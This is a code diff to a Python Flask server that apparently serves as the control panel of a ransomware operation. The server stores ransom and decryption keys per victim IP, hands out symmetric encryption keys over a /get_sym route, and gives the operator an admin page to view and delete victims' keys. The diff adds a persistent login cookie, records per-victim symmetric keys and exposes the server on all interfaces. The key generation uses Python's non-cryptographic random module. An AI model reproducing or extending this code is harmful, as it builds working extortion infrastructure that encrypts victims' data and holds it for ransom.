@@ -1,11 +1,12 @@
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
-from flask import Flask,request,render_template,redirect
+from flask import Flask,request,render_template,redirect,make_response
 import base64
 import random
 import hashlib
 import re
+import datetime
 
 global ransom_keys
 ransom_keys = {}
@@ -16,6 +17,12 @@ ALLOWED_USERS = {"admin":"f2d678c3dca032161b7afeae78a471260e8d68cf4d6bbd2c68741d
 global decryption_keys
 decryption_keys = {}
 
+global liste_cookie
+liste_cookie = []
+
+global symetric_keys
+symetric_keys = {}
+
 def hash_pass(passw):
     dk = hashlib.pbkdf2_hmac('sha256', bytes(str(base64.b64encode(bytes(passw,"utf-8"))),'utf-8'), bytes(str("qwerty"),"utf-8"), 100000)
     passwd = dk.hex()
@@ -25,6 +32,13 @@ def hashpass(password,username):
     string=f"${username}${password}${username}$"
     return hash_pass(string)
 
+def generate_cookie(username):
+    global liste_cookie
+    liste_char = [i for i in "AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn$%§?*µ@#&1234567890"]
+    cookie_body = "".join([random.choice(liste_char) for _ in range(30)])
+    cookie = f"${username}${cookie_body}${username[::-1]}$"
+    liste_cookie.append(cookie)
+    return cookie
 
 app = Flask(__name__)
 @app.route("/")
@@ -68,7 +82,11 @@ def decrypt():
 
 @app.route("/get_sym")
 def symetric():
-    return "".join([str(random.randint(0,9)) for _ in range(24)])
+    liste_char = [i for i in "AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn$%§?*µ@#&1234567890"]
+    key = "".join([random.choice(liste_char) for _ in range(24)])
+    global symetric_keys
+    symetric_keys[request.remote_addr]=key
+    return key
 
 @app.route("/get_hash")
 def get_hash():
@@ -86,6 +104,7 @@ def get_hash():
 def delete_key(key):
     global ransom_keys
     global decryption_keys
+    global symetric_keys
 
     new_ransom_keys = {}
     for i in ransom_keys.keys():
@@ -99,6 +118,12 @@ def delete_key(key):
             new_decryption_keys[i]=decryption_keys[i]
     decryption_keys=new_decryption_keys
 
+    new_symetric_keys = {}
+    for i in symetric_keys.keys():
+        if i.replace(".","")!=str(key):
+            new_symetric_keys[i]=symetric_keys[i]
+    symetric_keys=new_symetric_keys
+
     return redirect("/admin/",code=302)
 
 @app.route("/admin/",methods=["POST","GET"])
@@ -106,7 +131,14 @@ def admin_panel():
     global ransom_keys
     global decryption_keys
     global ALLOWED_USERS
+    global liste_cookie
+    global symetric_keys
     if request.method=="GET":
+        if request.cookies.get("keep_connected"):
+            if request.cookies.get("keep_connected") in liste_cookie:
+                ransom_keys_return = {i:[str(ransom_keys[i][0]).replace("\\n","<br/>"),str(ransom_keys[i][1]).replace("\\n","<br/>")] for i in ransom_keys.keys()}
+                username = request.cookies.get("keep_connected").split("$")[1]
+                return render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return,user=username,sym=symetric_keys)
         return render_template("login.html")
     elif request.method=="POST":
         username = request.values.get("username")
@@ -114,9 +146,14 @@ def admin_panel():
         if username in ALLOWED_USERS.keys():
             if ALLOWED_USERS[username]==hashpass(password,username):
                 ransom_keys_return = {i:[str(ransom_keys[i][0]).replace("\\n","<br/>"),str(ransom_keys[i][1]).replace("\\n","<br/>")] for i in ransom_keys.keys()}
-                return render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return)
-                #return "\n".join([f"<p>{i}</p>" for i in ransom_keys.keys()])
+                #return render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return)
+                expire_date = datetime.datetime.now()
+                expire_date = expire_date + datetime.timedelta(hours=1)
+                res = make_response(render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return,user=username,sym=symetric_keys))
+                res.set_cookie('keep_connected', generate_cookie(username), expires=expire_date)
+                return res
+
         return render_template("disallow.html")
 
 
-app.run(threaded=True, port=80)
+app.run(threaded=True, port=80, host="0.0.0.0")
